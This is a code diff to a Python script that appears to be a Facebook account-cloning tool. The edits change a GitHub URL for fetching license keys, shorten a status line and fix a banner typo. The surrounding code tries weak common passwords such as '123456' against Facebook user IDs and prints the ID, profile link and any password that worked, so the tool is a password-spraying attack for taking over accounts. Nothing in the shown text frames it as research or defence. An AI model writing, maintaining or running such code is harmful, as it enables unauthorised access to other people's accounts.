@@ -173,8 +173,8 @@ def check_key():
         except:
             pass
 
-    # Fetch keys from GitHub raw link
-    key_url = "https://raw.githubusercontent.com/rajavau379-pixel/Kamal-Raja/refs/heads/main/keys.txt"
+    # Updated clean GitHub raw link
+    key_url = "https://raw.githubusercontent.com/rajavau379-pixel/Kamal-Raja/main/keys.txt"
     try:
         response = requests.get(key_url, timeout=10)
         valid_keys = [k.strip() for k in response.text.splitlines() if k.strip() and not k.startswith("#")]
@@ -440,7 +440,7 @@ def login_1(uid):
 
 def login_2(uid):
     global loop
-    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRAJAVAU-M2\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
+    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRAJAVAU-M2\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
     
     for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
         try:
@@ -476,7 +476,7 @@ def login_2(uid):
 \033[1;32m┌──────────────────────────────────────────────────────────┐
 ║ \033[1;93m[🔥] SUCCESSFUL FACEBOOK ACCOUNT CREATED [🔥]\033[1;32m   ║
 ├──────────────────────────────────────────────────────────┤
-║ \033[1;37mName     : \033[1;96mCLON_ED ACCOUNT
+║ \033[1;37mName     : \033[1;96mCLONED ACCOUNT
 ║ \033[1;95mGmail    : \033[1;95m{uid}@facebook.com
 ║ \033[1;37mLink     : \033[1;94mhttps://www.facebook.com/{uid}
 ║ \033[1;37mPassword : \033[1;92m{pw}
